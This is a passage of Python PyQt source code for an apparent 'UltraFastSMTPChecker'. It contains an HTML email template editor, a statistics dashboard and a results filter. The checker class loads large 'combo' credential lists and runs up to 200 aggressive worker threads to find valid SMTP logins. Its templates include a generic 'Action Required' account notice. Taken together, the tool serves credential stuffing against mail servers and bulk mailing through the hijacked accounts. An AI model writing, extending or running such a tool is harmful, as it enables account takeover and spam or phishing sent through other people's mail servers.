{company} - Company name
{date} - Current date

Example:
Dear {name},

We hope this email finds you well...

Best regards,
{company}""")
        self.plain_editor.setStyleSheet("font-family: 'Consolas', monospace; font-size: 11px;")
        plain_layout.addWidget(self.plain_editor)
        
        self.tabs.addTab(plain_group, "📝 Plain Text")
        
        # HTML editor with advanced features
        html_group = QWidget()
        html_layout = QVBoxLayout(html_group)
        
        html_toolbar = QHBoxLayout()
        html_toolbar.addWidget(QLabel("🌐 HTML Content:"))
        
        # HTML tools
        html_tools = [
            ("📁 Load HTML", self.load_html),
            ("💾 Save HTML", self.save_html),
            ("👁️ Preview", self.preview_html),
            ("🎨 Templates", self.load_html_templates),
            ("🔧 Format", self.format_html)
        ]
        
        for text, func in html_tools:
            btn = QPushButton(text)
            btn.clicked.connect(func)
            btn.setStyleSheet("padding: 4px; font-size: 10px;")
            html_toolbar.addWidget(btn)
        
        html_layout.addLayout(html_toolbar)
        
        self.html_editor = QTextEdit()
        self.html_editor.setPlaceholderText("""Create beautiful HTML emails...

Basic HTML template:
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Email Template</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; }
        .header { background: #3498db; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; background: white; }
        .footer { background: #ecf0f1; padding: 10px; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Your Company Name</h1>
        </div>
        <div class="content">
            <h2>Hello {name}!</h2>
            <p>Your content goes here...</p>
        </div>
        <div class="footer">
            <p>&copy; 2025 Your Company. All rights reserved.</p>
        </div>
    </div>
</body>
</html>""")
        self.html_editor.setStyleSheet("font-family: 'Consolas', monospace; font-size: 11px;")
        html_layout.addWidget(self.html_editor)
        
        self.tabs.addTab(html_group, "🌐 HTML")
        
        layout.addWidget(self.tabs)
        
        # Email mode selection
        mode_group = QGroupBox("📧 Email Content Mode")
        mode_layout = QHBoxLayout(mode_group)
        
        self.mode_group = QButtonGroup()
        self.plain_mode = QRadioButton("📝 Send Plain Text Only")
        self.html_mode = QRadioButton("🌐 Send HTML (with plain text fallback)")
        self.both_mode = QRadioButton("📧 Send Both (Multipart)")
        
        self.both_mode.setChecked(True)  # Default to both
        
        self.mode_group.addButton(self.plain_mode)
        self.mode_group.addButton(self.html_mode)
        self.mode_group.addButton(self.both_mode)
        
        mode_layout.addWidget(self.plain_mode)
        mode_layout.addWidget(self.html_mode)
        mode_layout.addWidget(self.both_mode)
        
        layout.addWidget(mode_group)
        
        # Advanced options
        advanced_group = QGroupBox("⚙️ Advanced Options")
        advanced_layout = QGridLayout(advanced_group)
        
        self.auto_variables = QCheckBox("🔄 Auto-replace variables")
        self.auto_variables.setChecked(True)
        
        self.validate_html = QCheckBox("✅ Validate HTML")
        self.validate_html.setChecked(True)
        
        self.minify_html = QCheckBox("📦 Minify HTML")
        
        advanced_layout.addWidget(self.auto_variables, 0, 0)
        advanced_layout.addWidget(self.validate_html, 0, 1)
        advanced_layout.addWidget(self.minify_html, 0, 2)
        
        layout.addWidget(advanced_group)
        
        # Dialog buttons
        buttons = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok | 
            QDialogButtonBox.StandardButton.Cancel |
            QDialogButtonBox.StandardButton.Apply
        )
        buttons.accepted.connect(self.accept)
        buttons.rejected.connect(self.reject)
        buttons.button(QDialogButtonBox.StandardButton.Apply).clicked.connect(self.preview_html)
        
        layout.addWidget(buttons)
    
    def load_plain_text(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Load Plain Text", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    self.plain_editor.setPlainText(f.read())
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Failed to load file: {str(e)}")
    
    def save_plain_text(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Plain Text", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(self.plain_editor.toPlainText())
                QMessageBox.information(self, "Success", "Plain text saved successfully!")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Failed to save file: {str(e)}")
    
    def insert_variables_plain(self):
        """Insert common variables into plain text"""
        variables = [
            "{name}", "{email}", "{company}", "{date}", 
            "{time}", "{subject}", "{sender}"
        ]
        
        menu = QMenu(self)
        for var in variables:
            action = menu.addAction(var)
            action.triggered.connect(lambda checked, v=var: self.plain_editor.insertPlainText(v))
        
        menu.exec(QCursor.pos())
    
    def load_html(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Load HTML", "", "HTML Files (*.html *.htm);;All Files (*)"
        )
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    self.html_editor.setPlainText(f.read())
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Failed to load file: {str(e)}")
    
    def save_html(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save HTML", "", "HTML Files (*.html);;All Files (*)"
        )
        if file_path:
            try:
                html_content = self.html_editor.toPlainText()
                if self.minify_html.isChecked():
                    html_content = self.minify_html_content(html_content)
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(html_content)
                QMessageBox.information(self, "Success", "HTML saved successfully!")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Failed to save file: {str(e)}")
    
    def preview_html(self):
        """Enhanced HTML preview with validation"""
        html_content = self.html_editor.toPlainText()
        
        if not html_content.strip():
            QMessageBox.information(self, "Preview", "No HTML content to preview")
            return
        
        # Validate HTML if option is checked
        if self.validate_html.isChecked():
            validation_errors = self.validate_html_content(html_content)
            if validation_errors:
                reply = QMessageBox.question(
                    self, "HTML Validation", 
                    f"HTML validation found {len(validation_errors)} issues:\n\n" +
                    "\n".join(validation_errors[:5]) + 
                    ("\n... and more" if len(validation_errors) > 5 else "") +
                    "\n\nContinue with preview anyway?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                )
                if reply == QMessageBox.StandardButton.No:
                    return
        
        # Create preview with sample data
        preview_content = self.replace_sample_variables(html_content)
        
        # Create temporary HTML file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8') as f:
            f.write(preview_content)
            preview_path = f.name
        
        try:
            webbrowser.open(f"file://{preview_path}")
        except Exception as e:
            QMessageBox.warning(self, "Preview Error", f"Failed to open preview: {str(e)}")
    
    def load_html_templates(self):
        """Load predefined HTML templates"""
        templates = {
            "🎉 Promotional": self.get_promotional_template(),
            "📰 Newsletter": self.get_newsletter_template(),
            "🔔 Notification": self.get_notification_template(),
            "🎁 Welcome": self.get_welcome_template(),
            "📧 Simple": self.get_simple_template()
        }
        
        menu = QMenu(self)
        for name, template in templates.items():
            action = menu.addAction(name)
            action.triggered.connect(lambda checked, t=template: self.html_editor.setPlainText(t))
        
        menu.exec(QCursor.pos())
    
    def format_html(self):
        """Format HTML content for better readability"""
        try:
            import re
            html_content = self.html_editor.toPlainText()
            
            # Basic HTML formatting
            html_content = re.sub(r'><', '>\n<', html_content)
            html_content = re.sub(r'\n\s*\n', '\n', html_content)
            
            # Add proper indentation
            lines = html_content.split('\n')
            formatted_lines = []
            indent_level = 0
            
            for line in lines:
                line = line.strip()
                if line:
                    if line.startswith('</'):
                        indent_level = max(0, indent_level - 1)
                    
                    formatted_lines.append('  ' * indent_level + line)
                    
                    if line.startswith('<') and not line.startswith('</') and not line.endswith('/>'):
                        if not any(tag in line for tag in ['<br', '<hr', '<img', '<input', '<meta']):
                            indent_level += 1
            
            self.html_editor.setPlainText('\n'.join(formatted_lines))
            
        except Exception as e:
            QMessageBox.warning(self, "Format Error", f"Failed to format HTML: {str(e)}")
    
    def validate_html_content(self, html_content):
        """Basic HTML validation"""
        errors = []
        
        # Check for basic HTML structure
        if '<html>' not in html_content.lower():
            errors.append("Missing <html> tag")
        
        if '<head>' not in html_content.lower():
            errors.append("Missing <head> section")
        
        if '<body>' not in html_content.lower():
            errors.append("Missing <body> tag")
        
        # Check for unclosed tags
        import re
        open_tags = re.findall(r'<([a-zA-Z][a-zA-Z0-9]*)', html_content)
        close_tags = re.findall(r'</([a-zA-Z][a-zA-Z0-9]*)', html_content)
        
        # Simple check for major unclosed tags
        major_tags = ['html', 'head', 'body', 'div', 'table', 'tr', 'td']
        for tag in major_tags:
            if open_tags.count(tag) != close_tags.count(tag):
                errors.append(f"Unmatched <{tag}> tags")
        
        return errors
    
    def minify_html_content(self, html_content):
        """Basic HTML minification"""
        import re
        
        # Remove comments
        html_content = re.sub(r'<!--.*?-->', '', html_content, flags=re.DOTALL)
        
        # Remove extra whitespace
        html_content = re.sub(r'\s+', ' ', html_content)
        html_content = re.sub(r'>\s+<', '><', html_content)
        
        return html_content.strip()
    
    def replace_sample_variables(self, content):
        """Replace variables with sample data for preview"""
        replacements = {
            '{name}': 'John Doe',
            '{email}': 'john.doe@example.com',
            '{company}': 'Your Company',
            '{date}': time.strftime('%Y-%m-%d'),
            '{time}': time.strftime('%H:%M:%S'),
            '{subject}': self.subject_input.text() or 'Sample Subject',
            '{sender}': 'SMTP Checker'
        }
        
        for var, value in replacements.items():
            content = content.replace(var, value)
        
        return content
    
    def get_promotional_template(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Special Promotion</title>
    <style>
        body { font-family: 'Arial', sans-serif; margin: 0; padding: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 10px; overflow: hidden; }
        .header { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); padding: 30px; text-align: center; color: white; }
        .header h1 { margin: 0; font-size: 28px; }
        .content { padding: 30px; }
        .offer { background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; margin: 20px 0; }
        .cta-button { display: inline-block; background: #28a745; color: white; padding: 15px 30px; text-decoration: none; border-radius: 25px; font-weight: bold; margin: 20px 0; }
        .footer { background: #343a40; color: white; padding: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎉 Special Offer for {name}!</h1>
        </div>
        <div class="content">
            <h2>Exclusive Deal Just for You!</h2>
            <p>Dear {name},</p>
            <p>We're excited to offer you an exclusive deal that you won't find anywhere else!</p>
            
            <div class="offer">
                <h3>🎁 50% OFF Everything!</h3>
                <p>Use code: <strong>SPECIAL50</strong></p>
                <p>Valid until: {date}</p>
            </div>
            
            <p>Don't miss out on this incredible opportunity to save big!</p>
            
            <a href="#" class="cta-button">🛒 Shop Now</a>
            
            <p>Best regards,<br>{company} Team</p>
        </div>
        <div class="footer">
            <p>&copy; 2025 {company}. All rights reserved.</p>
        </div>
    </div>
</body>
</html>"""
    
    def get_newsletter_template(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Newsletter</title>
    <style>
        body { font-family: 'Georgia', serif; margin: 0; padding: 20px; background: #f4f4f4; }
        .container { max-width: 650px; margin: 0 auto; background: white; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .header { background: #2c3e50; color: white; padding: 25px; text-align: center; }
        .header h1 { margin: 0; font-size: 24px; }
        .date { color: #bdc3c7; font-size: 14px; }
        .article { padding: 25px; border-bottom: 1px solid #ecf0f1; }
        .article h2 { color: #2c3e50; margin-top: 0; }
        .article-meta { color: #7f8c8d; font-size: 12px; margin-bottom: 15px; }
        .read-more { color: #3498db; text-decoration: none; font-weight: bold; }
        .footer { background: #ecf0f1; padding: 20px; text-align: center; font-size: 12px; color: #7f8c8d; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📰 {company} Newsletter</h1>
            <div class="date">{date}</div>
        </div>
        
        <div class="article">
            <h2>Welcome to Our Newsletter, {name}!</h2>
            <div class="article-meta">Published on {date}</div>
            <p>Thank you for subscribing to our newsletter. Here's what's new this week:</p>
            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
            <a href="#" class="read-more">Read More →</a>
        </div>
        
        <div class="article">
            <h2>📈 Industry Insights</h2>
            <div class="article-meta">Market Analysis</div>
            <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
            <a href="#" class="read-more">Read Full Analysis →</a>
        </div>
        
        <div class="article">
            <h2>🔧 Product Updates</h2>
            <div class="article-meta">Feature Release</div>
            <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.</p>
            <a href="#" class="read-more">See What's New →</a>
        </div>
        
        <div class="footer">
            <p>You're receiving this because you subscribed to {company} newsletters.</p>
            <p><a href="#">Unsubscribe</a> | <a href="#">Update Preferences</a></p>
            <p>&copy; 2025 {company}. All rights reserved.</p>
        </div>
    </div>
</body>
</html>"""
    
    def get_notification_template(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Important Notification</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f8f9fa; }
        .container { max-width: 500px; margin: 0 auto; background: white; border-radius: 8px; overflow: hidden; border: 1px solid #dee2e6; }
        .header { background: #ffc107; color: #212529; padding: 20px; text-align: center; }
        .header h1 { margin: 0; font-size: 20px; }
        .content { padding: 25px; }
        .alert { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 5px; margin: 15px 0; }
        .button { display: inline-block; background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; }
        .footer { background: #f8f9fa; padding: 15px; text-align: center; font-size: 12px; color: #6c757d; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔔 Important Notification</h1>
        </div>
        <div class="content">
            <p>Hello {name},</p>
            
            <div class="alert">
                <strong>⚠️ Action Required:</strong> Please review the information below.
            </div>
            
            <p>We wanted to inform you about an important update regarding your account.</p>
            
            <p><strong>Details:</strong></p>
            <ul>
                <li>Notification Date: {date}</li>
                <li>Account: {email}</li>
                <li>Status: Requires Attention</li>
            </ul>
            
            <p>Please click the button below to take action:</p>
            
            <p style="text-align: center;">
                <a href="#" class="button">Take Action</a>
            </p>
            
            <p>If you have any questions, please don't hesitate to contact our support team.</p>
            
            <p>Best regards,<br>{company} Team</p>
        </div>
        <div class="footer">
            <p>This is an automated notification from {company}</p>
            <p>&copy; 2025 {company}. All rights reserved.</p>
        </div>
    </div>
</body>
</html>"""
    
    def get_welcome_template(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome!</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 20px; background: linear-gradient(120deg, #a8edea 0%, #fed6e3 100%); }
        .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 15px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px 30px; text-align: center; }
        .header h1 { margin: 0; font-size: 32px; }
        .welcome-icon { font-size: 48px; margin-bottom: 10px; }
        .content { padding: 40px 30px; }
        .feature { display: flex; align-items: center; margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; }
        .feature-icon { font-size: 24px; margin-right: 15px; }
        .cta-section { text-align: center; margin: 30px 0; }
        .cta-button { display: inline-block; background: linear-gradient(45deg, #667eea, #764ba2); color: white; padding: 15px 35px; text-decoration: none; border-radius: 30px; font-weight: bold; font-size: 16px; }
        .footer { background: #f8f9fa; padding: 30px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="welcome-icon">🎉</div>
            <h1>Welcome to {company}!</h1>
            <p>We're thrilled to have you aboard, {name}!</p>
        </div>
        <div class="content">
            <p>Dear {name},</p>
            
            <p>Thank you for joining {company}! We're excited to help you get started on your journey with us.</p>
            
            <h3>🚀 What's Next?</h3>
            
            <div class="feature">
                <div class="feature-icon">✅</div>
                <div>
                    <strong>Complete Your Profile</strong><br>
                    Add your information to personalize your experience
                </div>
            </div>
            
            <div class="feature">
                <div class="feature-icon">📚</div>
                <div>
                    <strong>Explore Our Resources</strong><br>
                    Check out our guides and tutorials to get started
                </div>
            </div>
            
            <div class="feature">
                <div class="feature-icon">🤝</div>
                <div>
                    <strong>Connect with Support</strong><br>
                    Our team is here to help you every step of the way
                </div>
            </div>
            
            <div class="cta-section">
                <p>Ready to begin your journey?</p>
                <a href="#" class="cta-button">Get Started Now</a>
            </div>
            
            <p>If you have any questions, feel free to reach out to us. We're here to help!</p>
            
            <p>Welcome aboard!<br>The {company} Team</p>
        </div>
        <div class="footer">
            <p>🌟 Thank you for choosing {company}</p>
            <p>&copy; 2025 {company}. All rights reserved.</p>
        </div>
    </div>
</body>
</html>"""
    
    def get_simple_template(self):
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Email</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #ffffff; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
        .header { border-bottom: 2px solid #007bff; padding-bottom: 20px; margin-bottom: 20px; }
        .header h1 { color: #007bff; margin: 0; }
        .content { line-height: 1.6; color: #333; }
        .footer { border-top: 1px solid #ddd; padding-top: 20px; margin-top: 20px; text-align: center; color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{company}</h1>
        </div>
        <div class="content">
            <p>Dear {name},</p>
            
            <p>This is a simple, clean email template that you can customize for your needs.</p>
            
            <p>Some key points:</p>
            <ul>
                <li>Clean and professional design</li>
                <li>Mobile-friendly layout</li>
                <li>Easy to customize</li>
            </ul>
            
            <p>You can replace this content with your own message.</p>
            
            <p>Best regards,<br>{company}</p>
        </div>
        <div class="footer">
            <p>Email sent on {date} at {time}</p>
            <p>&copy; 2025 {company}. All rights reserved.</p>
        </div>
    </div>
</body>
</html>"""
    
    def get_template_data(self):
        """Get the configured template data"""
        subject = self.subject_input.text()
        plain_text = self.plain_editor.toPlainText()
        html = self.html_editor.toPlainText()
        
        # Determine mode
        use_html = self.html_mode.isChecked() or self.both_mode.isChecked()
        use_plain = self.plain_mode.isChecked() or self.both_mode.isChecked()
        
        # Process variables if auto-replace is enabled
        if self.auto_variables.isChecked():
            # This will be handled during sending
            pass
        
        # Minify HTML if requested
        if self.minify_html.isChecked() and html:
            html = self.minify_html_content(html)
        
        return {
            "subject": subject,
            "plain_text": plain_text,
            "html": html,
            "use_html": use_html,
            "use_plain": use_plain,
            "auto_variables": self.auto_variables.isChecked(),
            "mode": "both" if self.both_mode.isChecked() else ("html" if self.html_mode.isChecked() else "plain")
        }

class StatsWidget(QWidget):
    """Real-time statistics dashboard"""
    def __init__(self):
        super().__init__()
        self.init_ui()
        
        # Update timer
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_display)
        self.timer.start(1000)  # Update every second
        
        self.stats = None
    
    def init_ui(self):
        layout = QGridLayout(self)
        
        # Create stat boxes
        self.stat_boxes = {}
        
        # Row 1: Basic stats
        self.create_stat_box("processed", "📊 Processed", "0", 0, 0)
        self.create_stat_box("valid", "✅ Valid Found", "0", 0, 1)
        self.create_stat_box("success_rate", "📈 Success Rate", "0%", 0, 2)
        self.create_stat_box("speed", "⚡ Speed", "0/s", 0, 3)
        
        # Row 2: Detailed stats
        self.create_stat_box("rate_limits", "⚡ Rate Limits", "0", 1, 0)
        self.create_stat_box("size_limits", "📦 Size Limits", "0", 1, 1)
        self.create_stat_box("unknown", "❓ Unknown", "0", 1, 2)
        self.create_stat_box("elapsed", "⏱️ Elapsed", "0s", 1, 3)
        
        # Row 3: Top ports and providers
        self.top_ports_label = QLabel("🔌 Top Ports: None")
        self.top_ports_label.setStyleSheet("font-size: 10px; color: #7f8c8d;")
        layout.addWidget(self.top_ports_label, 2, 0, 1, 2)
        
        self.top_providers_label = QLabel("📧 Top Providers: None")
        self.top_providers_label.setStyleSheet("font-size: 10px; color: #7f8c8d;")
        layout.addWidget(self.top_providers_label, 2, 2, 1, 2)
    
    def create_stat_box(self, key, title, initial_value, row, col):
        """Create a statistics box"""
        frame = QFrame()
        frame.setFrameStyle(QFrame.Shape.Box)
        frame.setStyleSheet("""
            QFrame {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                background: white;
                padding: 5px;
            }
        """)
        
        layout = QVBoxLayout(frame)
        layout.setContentsMargins(5, 5, 5, 5)
        
        title_label = QLabel(title)
        title_label.setStyleSheet("font-size: 10px; font-weight: bold; color: #2c3e50;")
        
        value_label = QLabel(initial_value)
        value_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #27ae60;")
        value_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        
        layout.addWidget(title_label)
        layout.addWidget(value_label)
        
        self.layout().addWidget(frame, row, col)
        self.stat_boxes[key] = value_label
    
    def update_stats(self, stats):
        """Update statistics"""
        self.stats = stats
    
    def update_display(self):
        """Update the display with current stats"""
        if not self.stats:
            return
        
        # Update basic stats
        self.stat_boxes["processed"].setText(f"{self.stats.get('processed', 0):,}")
        self.stat_boxes["valid"].setText(f"{self.stats.get('valid_found', 0):,}")
        self.stat_boxes["success_rate"].setText(f"{self.stats.get('success_rate', 0):.2f}%")
        self.stat_boxes["speed"].setText(f"{self.stats.get('current_speed', 0):.1f}/s")
        
        # Update detailed stats
        self.stat_boxes["rate_limits"].setText(f"{self.stats.get('rate_limits', 0):,}")
        self.stat_boxes["size_limits"].setText(f"{self.stats.get('size_limits', 0):,}")
        self.stat_boxes["unknown"].setText(f"{self.stats.get('unknown_limits', 0):,}")
        
        elapsed = self.stats.get('elapsed', 0)
        if elapsed < 60:
            elapsed_str = f"{elapsed:.0f}s"
        elif elapsed < 3600:
            elapsed_str = f"{elapsed/60:.1f}m"
        else:
            elapsed_str = f"{elapsed/3600:.1f}h"
        self.stat_boxes["elapsed"].setText(elapsed_str)
        
        # Update top ports and providers
        ports = self.stats.get('ports_found', {})
        if ports:
            top_ports = sorted(ports.items(), key=lambda x: x[1], reverse=True)[:3]
            ports_text = ", ".join([f"{port}({count})" for port, count in top_ports])
            self.top_ports_label.setText(f"🔌 Top Ports: {ports_text}")
        
        providers = self.stats.get('providers_found', {})
        if providers:
            top_providers = sorted(providers.items(), key=lambda x: x[1], reverse=True)[:3]
            providers_text = ", ".join([f"{prov}({count})" for prov, count in top_providers])
            self.top_providers_label.setText(f"📧 Top Providers: {providers_text}")

class FilterWidget(QWidget):
    """Advanced filtering widget"""
    def __init__(self, table_widget):
        super().__init__()
        self.table = table_widget
        self.init_ui()
        self.original_data = []
    
    def init_ui(self):
        layout = QVBoxLayout(self)
        
        # Filter header
        header = QLabel("🔍 Advanced Filters")
        header.setStyleSheet("font-weight: bold; font-size: 12px; color: #2c3e50;")
        layout.addWidget(header)
        
        # Filter controls
        controls_layout = QGridLayout()
        
        # Provider filter
        controls_layout.addWidget(QLabel("Provider:"), 0, 0)
        self.provider_combo = QComboBox()
        self.provider_combo.addItems(["All", "Gmail", "Outlook", "Yahoo", "iCloud", "Other"])
        self.provider_combo.currentTextChanged.connect(self.apply_filters)
        controls_layout.addWidget(self.provider_combo, 0, 1)
        
        # Port filter
        controls_layout.addWidget(QLabel("Port:"), 0, 2)
        self.port_combo = QComboBox()
        self.port_combo.addItems(["All", "587", "465", "25", "2525", "Other"])
        self.port_combo.currentTextChanged.connect(self.apply_filters)
        controls_layout.addWidget(self.port_combo, 0, 3)
        
        # Limit type filter
        controls_layout.addWidget(QLabel("Limit Type:"), 1, 0)
        self.limit_type_combo = QComboBox()
        self.limit_type_combo.addItems(["All", "Rate Limit", "Size Limit", "Unknown"])
        self.limit_type_combo.currentTextChanged.connect(self.apply_filters)
        controls_layout.addWidget(self.limit_type_combo, 1, 1)
        
        # Min limit filter
        controls_layout.addWidget(QLabel("Min Limit:"), 1, 2)
        self.min_limit_input = QLineEdit()
        self.min_limit_input.setPlaceholderText("e.g., 100")
        self.min_limit_input.textChanged.connect(self.apply_filters)
        controls_layout.addWidget(self.min_limit_input, 1, 3)
        
        # Search filter
        controls_layout.addWidget(QLabel("Search:"), 2, 0)
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("Search in any column...")
        self.search_input.textChanged.connect(self.apply_filters)
        controls_layout.addWidget(self.search_input, 2, 1, 1, 2)
        
        # Clear filters button
        clear_button = QPushButton("🗑️ Clear")
        clear_button.clicked.connect(self.clear_filters)
        controls_layout.addWidget(clear_button, 2, 3)
        
        layout.addLayout(controls_layout)
        
        # Filter stats
        self.filter_stats = QLabel("No filters applied")
        self.filter_stats.setStyleSheet("font-size: 10px; color: #7f8c8d; font-style: italic;")
        layout.addWidget(self.filter_stats)
    
    def save_original_data(self):
        """Save original table data"""
        self.original_data = []
        for row in range(self.table.rowCount()):
            row_data = []
            for col in range(self.table.columnCount()):
                item = self.table.item(row, col)
                row_data.append(item.text() if item else "")
            self.original_data.append(row_data)
    
    def apply_filters(self):
        """Apply all active filters"""
        if not self.original_data:
            self.save_original_data()
        
        filtered_data = self.original_data.copy()
        
        # Apply provider filter
        provider = self.provider_combo.currentText()
        if provider != "All":
            filtered_data = [row for row in filtered_data if len(row) > 6 and row[6] == provider]
        
        # Apply port filter
        port = self.port_combo.currentText()
        if port != "All":
            if port == "Other":
                filtered_data = [row for row in filtered_data if len(row) > 1 and row[1] not in ["587", "465", "25", "2525"]]
            else:
                filtered_data = [row for row in filtered_data if len(row) > 1 and row[1] == port]
        
        # Apply limit type filter
        limit_type = self.limit_type_combo.currentText()
        if limit_type != "All":
            if limit_type == "Rate Limit":
                filtered_data = [row for row in filtered_data if len(row) > 4 and any(x in row[4] for x in ["/hour", "/day", "/min"])]
            elif limit_type == "Size Limit":
                filtered_data = [row for row in filtered_data if len(row) > 4 and any(x in row[4] for x in ["MB", "KB", "B"])]
            elif limit_type == "Unknown":
                filtered_data = [row for row in filtered_data if len(row) > 4 and row[4] == "Unknown"]
        
        # Apply min limit filter
        min_limit = self.min_limit_input.text().strip()
        if min_limit and min_limit.isdigit():
            min_val = int(min_limit)
            filtered_data = [row for row in filtered_data if self._extract_limit_value(row[4] if len(row) > 4 else "") >= min_val]
        
        # Apply search filter
        search_text = self.search_input.text().strip().lower()
        if search_text:
            filtered_data = [row for row in filtered_data if any(search_text in cell.lower() for cell in row)]
        
        # Update table
        self.table.populate_table_with_data(filtered_data)
        
        # Update filter stats
        total_original = len(self.original_data)
        total_filtered = len(filtered_data)
        self.filter_stats.setText(f"Showing {total_filtered} of {total_original} records")
    
    def _extract_limit_value(self, limit_text):
        """Extract numerical value from limit text"""
        import re
        numbers = re.findall(r'\d+', limit_text)
        if numbers:
            return int(numbers[0])
        return 0
    
    def clear_filters(self):
        """Clear all filters"""
        self.provider_combo.setCurrentText("All")
        self.port_combo.setCurrentText("All")
        self.limit_type_combo.setCurrentText("All")
        self.min_limit_input.clear()
        self.search_input.clear()
        
        if self.original_data:
            self.table.populate_table_with_data(self.original_data)
            self.filter_stats.setText("No filters applied")

class UltraFastSMTPChecker:
    def __init__(self, test_email, max_threads=200, email_mode="credentials", template_data=None):
        self.test_email = test_email
        self.max_threads = max_threads
        self.email_mode = email_mode
        self.template_data = template_data
        
        self.valid_smtps = set()
        self.workers = []
        self.total_combos = 0
        self.processed_combos = 0
        self.start_time = None
        
        # Advanced components
        self.stats = RealTimeStats()
        self.signals = WorkerSignals()
        self.result_writer = AsyncResultWriter()
        
        # File handler
        self.file_handler = None
        
    def load_combos(self, filename, progress_callback=None):
        """Load combos using optimized file handler"""
        self.file_handler = LargeFileHandler(filename)
        self.total_combos = self.file_handler.valid_combos
        
        self.signals.log.emit(f"📂 Loading {filename}...")
        self.signals.log.emit(f"📊 File size: {self.file_handler.file_size / 1024 / 1024:.1f}MB")
        
        def progress_update(processed, total):
            if progress_callback:
                progress_callback(processed, total)
        
        # Create generator for combo loading
        combo_generator = self.file_handler.load_combos_generator(progress_update)
        
        self.signals.log.emit(f"✅ Ready to process {self.file_handler.valid_combos} valid combos")
        return combo_generator
    
    def start(self, combos):
        """Start the ultra-fast SMTP checking process"""
        self.workers = []
        self.processed_combos = 0
        self.start_time = time.time()
        self.stats.reset()
        
        # Start result writer
        self.result_writer.start()
        
        # Calculate optimal thread count
        cpu_count = os.cpu_count() or 4
        optimal_threads = min(self.max_threads, cpu_count * 30)  # Aggressive threading
        
        if optimal_threads <= 0:
            return
        
        self.signals.log.emit(f"🚀 Launching {optimal_threads} ultra-fast workers...")
        
        # Distribute work among workers
        worker_generators = self._distribute_work(combos, optimal_threads)
        
        # Create and start worker threads
        for i, worker_gen in enumerate(worker_generators):
            worker = UltraFastSMTPWorker(
                worker_gen, 
                self.test_email, 
                self.stats, 
                i+1,
                self.email_mode,
                self.template_data
            )
            worker.signals.progress.connect(self.update_progress)
            worker.signals.log.connect(self.signals.log.emit)
            worker.signals.valid_smtp.connect(self._handle_valid_smtp)
            worker.signals.finished.connect(self.check_finished)
            self.workers.append(worker)
            worker.start()
        
        # Start stats timer
        self.stats_timer = QTimer()
        self.stats_timer.timeout.connect(self._emit_stats)
        self.stats_timer.start(1000)  # Every second
    
    def _distribute_work(self, combos, num_workers):
